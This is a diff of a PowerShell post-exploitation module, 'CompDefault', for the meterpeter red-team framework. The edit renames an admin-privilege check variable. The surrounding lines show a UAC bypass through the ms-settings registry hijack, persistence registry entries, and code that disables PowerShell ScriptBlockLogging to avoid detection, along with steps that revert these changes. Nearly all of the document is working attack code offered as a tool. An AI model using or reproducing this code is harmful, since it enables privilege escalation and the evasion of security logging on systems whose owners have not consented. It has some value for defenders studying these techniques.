@@ -88,9 +88,9 @@ If(-not($param1) -or $param1 -eq $null){
 }
 
 ## CompDefault meterpeter post-module banner
+$CheckClientPrivs = [bool](([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -match"S-1-5-32-544")
 Write-Host "`nCompDefault v1.2 - By r00t-3xp10it (SSA RedTeam @2020)" -ForeGroundColor Green
 Write-Host "[+] Executing Command: '$Command'";Start-Sleep -Milliseconds 400
-
 
 ## Check for regedit vulnerable HIVE existence before continue any further ..
 $CheckVuln = Test-Path -Path "HKCU:\Software\Classes\ms-settings" -EA SilentlyContinue
@@ -106,7 +106,6 @@ If($CheckVuln -eq $True -or $param2 -ieq "-Force"){
 
    ## Delete 'persistence' '$Command' left behind by: '$MakeItPersistence' function.
    # This function 'reverts' all regedit hacks to the previous state before the EOP.
-   $CheckAmsiLogging = [bool](([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -match"S-1-5-32-544")
    If($param1 -eq "deleteEOP"){
       Write-Host "[+] Deleting  => EOP registry hacks (revert)";Start-Sleep -Milliseconds 400
       ## Make sure the vulnerable registry key exists
@@ -114,25 +113,21 @@ If($CheckVuln -eq $True -or $param2 -ieq "-Force"){
          Remove-Item "HKCU:\Software\Classes\ms-settings\shell" -Recurse -Force|Out-Null;Start-Sleep -Seconds 1
          Write-Host "[ ] Success   => MakeItPersistence (`$Command) reverted." -ForegroundColor Green;Start-Sleep -Milliseconds 400
          Write-Host "[ ] HIVE      => HKCU:\Software\Classes\ms-settings\shell\open\command"
-
          ## Revert ScriptBlockLogging (default)
-         If($CheckAmsiLogging -eq $True){
+         If($CheckClientPrivs -eq $True){
             If(Test-Path -Path "HKLM:\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging"){
                Write-Host "[ ] Admin     => Enable AMSI ScriptBlockLogging." -ForeGroundColor Yellow
                Remove-Item -Path "HKLM:\Software\Policies\Microsoft\Windows\PowerShell" -Recurse -Force -EA SilentlyContinue|Out-Null
             }
          }
-
       }Else{
-
          ## Revert ScriptBlockLogging (default)
-         If($CheckAmsiLogging -eq $True){
+         If($CheckClientPrivs -eq $True){
             If(Test-Path -Path "HKLM:\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging"){
                Write-Host "[ ] Admin     => Enable AMSI ScriptBlockLogging." -ForeGroundColor Yellow
                Remove-Item -Path "HKLM:\Software\Policies\Microsoft\Windows\PowerShell" -Recurse -Force -EA SilentlyContinue|Out-Null
             }
          }
-
          Write-Host "[ ] Failed    => None CompDefault registry keys found under:" -ForegroundColor Red;Start-Sleep -Milliseconds 400
          Write-Host "[ ] HIVE      => HKCU:\Software\Classes\ms-settings\shell\open\command"
       }
@@ -152,7 +147,7 @@ If($CheckVuln -eq $True -or $param2 -ieq "-Force"){
 
    ## Add Entrys to Regedit { using powershell }
    # disable AMSI ScriptBlockLogging (IF admin shell)
-   If($CheckAmsiLogging -eq $True){
+   If($CheckClientPrivs -eq $True){
       Write-Host "[ ] Admin     => Disable AMSI ScriptBlockLogging." -ForeGroundColor Green;Start-Sleep -Milliseconds 400
       New-Item -Path "HKLM:\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging" -Force -EA SilentlyContinue|Out-Null
       Set-ItemProperty -Path "HKLM:\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging" -Name "EnableScriptBlockLogging" -Value "0" -Type "DWORD" -Force -EA SilentlyContinue|Out-Null
@@ -298,7 +293,7 @@ If($CheckVuln -eq $True -or $param2 -ieq "-Force"){
 }
 
 ## Revert ScriptBlockLogging (default)
-If($CheckAmsiLogging -eq $True){
+If($CheckClientPrivs -eq $True){
    If(Test-Path -Path "HKLM:\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging"){
       Remove-Item -Path "HKLM:\Software\Policies\Microsoft\Windows\PowerShell" -Recurse -Force -EA SilentlyContinue|Out-Null
    }
